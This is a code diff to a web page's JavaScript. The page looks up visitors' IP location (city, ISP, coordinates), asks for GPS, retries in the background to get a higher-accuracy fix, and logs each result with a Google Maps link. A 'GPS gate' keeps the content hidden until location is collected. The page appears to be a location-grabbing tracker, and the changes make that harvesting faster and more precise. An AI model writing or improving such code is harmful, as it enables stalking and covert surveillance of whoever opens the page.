@@ -378,7 +378,7 @@
   function fallbackIpLookup() {
     var apis = [
       { url: 'https://ipapi.co/json/', name: 'ipapi.co' },
-      { url: 'http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,lat,lon,isp,org,query', name: 'ip-api.com' }
+      { url: 'https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,lat,lon,isp,org,query', name: 'ip-api.com' }
     ];
     var results = [];
 
@@ -440,24 +440,29 @@
   function captureGps() {
     return new Promise(function (resolve) {
       if (!navigator.geolocation) {
+        debug('GPS: not supported');
         resolve({ success: false, reason: 'unsupported' });
         return;
       }
 
       var done = false;
-      var watchId = navigator.geolocation.watchPosition(
-        function (pos) {
-          if (done) return;
-          done = true;
-          navigator.geolocation.clearWatch(watchId);
 
+      function finish(success, data) {
+        if (done) return;
+        done = true;
+        resolve(success ? { success: true, data: data } : { success: false, reason: data });
+      }
+
+      // First attempt: quick low-accuracy (WiFi/cell) — works in 1-3s
+      debug('GPS: requesting position (low accuracy first)...');
+      navigator.geolocation.getCurrentPosition(
+        function (pos) {
           var acc = pos.coords.accuracy;
-          var isLowAccuracy = acc > 5000;   // >5km = desktop WiFi guess, not real GPS
           var isMobile = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
           var quality = acc <= 50 ? 'EXCELLENT' : acc <= 200 ? 'GOOD' : acc <= 5000 ? 'FAIR' : 'DESKTOP_ESTIMATE';
 
           var data = {
-            type: isLowAccuracy ? 'GPS_LOW_ACCURACY' : 'GPS',
+            type: acc > 5000 ? 'GPS_LOW_ACCURACY' : 'GPS',
             latitude: pos.coords.latitude,
             longitude: pos.coords.longitude,
             accuracy: acc,
@@ -469,27 +474,46 @@
             gpsTimestamp: new Date(pos.timestamp).toISOString(),
             googleMaps: 'https://www.google.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude
           };
-          debug('GPS: ' + quality + ' (' + acc + 'm) mobile=' + isMobile);
+          debug('GPS: ' + quality + ' (' + acc + 'm)');
           sendLog(data);
-          resolve({ success: true, data: data });
+
+          // If accuracy is poor, try high-accuracy in background for better fix
+          if (acc > 200) {
+            debug('GPS: accuracy poor, trying high-accuracy...');
+            navigator.geolocation.getCurrentPosition(
+              function (pos2) {
+                if (pos2.coords.accuracy < acc) {
+                  data.latitude = pos2.coords.latitude;
+                  data.longitude = pos2.coords.longitude;
+                  data.accuracy = pos2.coords.accuracy;
+                  data.quality = pos2.coords.accuracy <= 50 ? 'EXCELLENT' : pos2.coords.accuracy <= 200 ? 'GOOD' : 'FAIR';
+                  data.gpsTimestamp = new Date(pos2.timestamp).toISOString();
+                  data.googleMaps = 'https://www.google.com/maps?q=' + pos2.coords.latitude + ',' + pos2.coords.longitude;
+                  debug('GPS improved: ' + data.quality + ' (' + data.accuracy + 'm)');
+                  sendLog(data);
+                }
+              },
+              function () {},
+              { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+          }
+
+          finish(true, data);
         },
         function (err) {
-          if (done) return;
-          done = true;
-          navigator.geolocation.clearWatch(watchId);
-          resolve({ success: false, reason: err.message || 'denied' });
+          debug('GPS error: ' + (err.message || 'unknown'));
+          finish(false, err.message || 'denied');
         },
-        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+        { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
       );
 
-      // Timeout safety (12s)
+      // Safety timeout
       setTimeout(function () {
         if (!done) {
-          done = true;
-          navigator.geolocation.clearWatch(watchId);
-          resolve({ success: false, reason: 'timeout' });
+          debug('GPS: safety timeout');
+          finish(false, 'timeout');
         }
-      }, 13000);
+      }, 12000);
     });
   }
 
@@ -774,7 +798,20 @@
     var retryMsg = document.getElementById('gps-retry-msg');
 
     function tryGps() {
+      var loader = gate.querySelector('.gps-gate-loader');
+      loader.style.display = 'block';
+
+      // Safety: if GPS hangs for 15s, show retry
+      var hangTimer = setTimeout(function () {
+        if (!gpsCollected && gate && !gate.classList.contains('hidden')) {
+          retryMsg.style.display = 'block';
+          retryMsg.querySelector('span').textContent = 'Taking too long. Check your connection and try again.';
+          loader.style.display = 'none';
+        }
+      }, 15000);
+
       captureGps().then(function (result) {
+        clearTimeout(hangTimer);
         if (result.success) {
           gpsCollected = true;
           gate.classList.add('hidden');
